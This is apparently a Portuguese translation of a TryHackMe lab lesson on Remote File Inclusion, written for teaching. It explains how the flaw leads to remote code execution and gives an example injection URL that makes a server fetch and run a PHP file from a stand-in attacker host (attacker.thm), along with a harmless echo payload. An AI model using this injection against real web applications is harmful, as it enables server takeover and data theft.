Inclusão Remota de Arquivos - Solicitação de Informação (RFI)

A Inclusão Remota de Arquivos ( RFI , na sigla em inglês) é uma técnica para incluir arquivos remotos em um aplicativo vulnerável. Assim como a Inclusão Local de Arquivos ( LFI , na sigla em inglês) , a RFI ocorre quando a entrada do usuário é tratada incorretamente, permitindo que um invasor injete uma URL externa na função de inclusão . Um requisito para a RFI é que a opção `allow_url_fopen` esteja ativada .

O risco de RFI é maior do que o de LFI, pois as vulnerabilidades de RFI permitem que um invasor obtenha Execução Remota de Comandos ( RCE ) no servidor. Outras consequências de um ataque de RFI bem-sucedido incluem:

Divulgação de informações sensíveis
Cross-site Scripting ( XSS )
Negação de Serviço ( DoS )
Para que um ataque RFI seja bem-sucedido, um servidor externo precisa se comunicar com o servidor de aplicativos . Nesse ataque, o atacante hospeda arquivos maliciosos em seu servidor. Em seguida, o arquivo malicioso é injetado na função `include` por meio de requisições HTTP , e o conteúdo do arquivo malicioso é executado no servidor de aplicativos vulnerável.

Etapas de RFI



A figura acima é um exemplo das etapas para um ataque RFI bem -sucedido ! Digamos que o atacante hospede um arquivo PHP em seu próprio servidor http ://atacante.thm/cmd.txt onde cmd.txt contém uma mensagem de impressão  Hello THM .

<?PHP echo "Hello THM"; ?>
Primeiro , o atacante injeta a URL maliciosa, que aponta para o servidor do atacante, como  http : //webapp.thm/index.php ?lang= http ://attacker.thm/cmd.txt . Se não houver validação de entrada, a URL maliciosa passa para a função `include`. Em seguida, o servidor da aplicação web envia uma requisição GET para o servidor malicioso para buscar o arquivo. Como resultado, a aplicação web inclui o arquivo remoto na função `include` para executar o arquivo PHP dentro da página e enviar o conteúdo da execução para o atacante. No nosso caso, a página atual precisa exibir a mensagem "Olá THM" em algum lugar .

Acesse o seguinte URL do laboratório:  http : //IP_DA_MÁQUINA/playground.php  para testar um ataque RFI .
